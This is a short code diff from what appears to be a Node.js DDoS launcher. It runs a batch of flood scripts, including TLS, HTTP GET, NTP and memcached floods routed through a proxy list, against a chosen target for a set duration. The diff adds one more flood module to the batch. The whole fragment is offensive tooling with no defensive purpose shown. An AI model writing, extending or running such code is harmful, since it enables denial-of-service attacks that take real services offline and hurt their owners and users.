@@ -377,6 +377,7 @@ const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
 const peterda = path.join(__dirname, `/lib/cache/Peterda.js`);
 const ntp = path.join(__dirname, `NTP`);
 const mem = path.join(__dirname, `MEM`);
+const jennesse = path.join(__dirname, `/lib/cache/jennessee.js`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -391,6 +392,7 @@ const mem = path.join(__dirname, `MEM`);
 	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
         exec(`node ${ntp} ${target} 80 ${duration}`)
         exec(`node ${mem} ${target} 80 ${duration}`)
+	exec(`node ${jennesse} GET ${target} ${duration} 100  --debug`)
 	  
 	  
           sigma()
